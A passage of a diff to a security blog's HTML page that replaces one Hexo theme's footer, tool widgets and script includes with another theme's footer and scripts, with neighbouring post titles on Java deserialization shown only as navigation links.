+                    <h3 class="title">CTFSHOW-Java反序列化</h3>
+                </div>
             </div>
+        </a>
         
         
-            <script data-swup-reload-script>
-                try {
-                    function odometer_init() {
-                    const elements = document.querySelectorAll('.odometer');
-                    elements.forEach(el => {
-                        new Odometer({
-                            el,
-                            format: '( ddd).dd',
-                            duration: 200
-                        });
-                    });
-                    }
-                    odometer_init();
-                } catch (error) {}
-            </script>
+        <a href="/2025/02/02/Java%E5%AE%89%E5%85%A8-Commons-Collections-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">Java安全-Commons-Collections 7利用链分析</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
         
         
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
             
+            <div class="group">
+                <h2 class="title">Blog</h2>
                 
-        
+                <a href="/" class="item">Blog</a>
                 
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/projects" class="item">Projects</a>
+                
+                <a href="/resume" class="item">Resume</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2025 p0l1st<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
         
         
-    </div>  
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
 </footer>
-        </div>
-    </div>
 
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
+
         
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
+<script src="/js/main.js"></script>
+
         
-
-        <!-- go comment -->
         
-            <li class="go-comment">
-                <i class="fa-regular fa-comments"></i>
-            </li>
-        
-    </ul>
-</div>
-
-        </div>
-    
-
-    <div class="right-side-tools-container">
-        <div class="side-tools-container">
-    <ul class="hidden-tools-list">
-        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-plus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-minus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-            <i class="fa-regular fa-moon"></i>
-        </li>
-
-        <!-- rss -->
         
 
         
-
-        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-            <i class="fa-regular fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="visible-tools-list">
-        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-            <i class="fa-regular fa-cog fa-spin"></i>
-        </li>
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
         
-            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-                <i class="arrow-up fas fa-arrow-up"></i>
-                <span class="percent"></span>
-            </li>
-        
-        
-    </ul>
-</div>
-
-    </div>
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
-        <div class="search-pop-overlay">
-    <div class="popup search-popup">
-        <div class="search-header">
-          <span class="search-input-field-pre">
-            <i class="fa-solid fa-keyboard"></i>
-          </span>
-            <div class="search-input-container">
-                <input autocomplete="off"
-                       autocorrect="off"
-                       autocapitalize="off"
-                       placeholder="Search..."
-                       spellcheck="false"
-                       type="search"
-                       class="search-input"
-                >
-            </div>
-            <span class="popup-btn-close">
-                <i class="fa-solid fa-times"></i>
-            </span>
-        </div>
-        <div id="search-result">
-            <div id="no-result">
-                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
-            </div>
-        </div>
-    </div>
-</div>
-
-    
-
-</main>
-
-
-    
-<script src="/js/libs/Swup.min.js"></script>
-
-<script src="/js/libs/SwupSlideTheme.min.js"></script>
-
-<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
-
-<script src="/js/libs/SwupProgressPlugin.min.js"></script>
-
-<script src="/js/libs/SwupScrollPlugin.min.js"></script>
-
-<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
-
-<script>
-    const swup = new Swup({
-        plugins: [
-            new SwupScriptsPlugin({
-                optin: true,
-            }),
-            new SwupProgressPlugin(),
-            new SwupScrollPlugin({
-                offset: 80,
-            }),
-            new SwupSlideTheme({
-                mainElement: ".main-content-body",
-            }),
-            new SwupPreloadPlugin(),
-        ],
-        containers: ["#swup"],
-    });
-</script>
-
-
-
-
-
-
-
-<script src="/js/tools/imageViewer.js" type="module"></script>
-
-<script src="/js/utils.js" type="module"></script>
-
-<script src="/js/main.js" type="module"></script>
-
-<script src="/js/layouts/navbarShrink.js" type="module"></script>
-
-<script src="/js/tools/scrollTopBottom.js" type="module"></script>
-
-<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
-
-<script src="/js/layouts/categoryList.js" type="module"></script>
-
-
-
-    
-<script src="/js/tools/localSearch.js" type="module"></script>
-
-
-
-
-    
-<script src="/js/tools/codeBlock.js" type="module"></script>
-
-
-
-
-    
-<script src="/js/layouts/lazyload.js" type="module"></script>
-
-
-
-
-    
-<script src="/js/tools/runtime.js"></script>
-
-    
-<script src="/js/libs/odometer.min.js"></script>
-
-    
-<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
-
-
-
-
-  
-<script src="/js/libs/Typed.min.js"></script>
-
-  
-<script src="/js/plugins/typed.js" type="module"></script>
-
-
-
-
-
-
-
-
-    
-<script src="/js/libs/anime.min.js"></script>
-
-
-
-<div class="post-scripts" data-swup-reload-script>
-    
-        
-<script src="/js/tools/tocToggle.js" type="module"></script>
-
-<script src="/js/layouts/toc.js" type="module"></script>
-
-<script src="/js/plugins/tabs.js" type="module"></script>
-
-    
-</div>
-
-
-</body>
+    </body>
 </html>
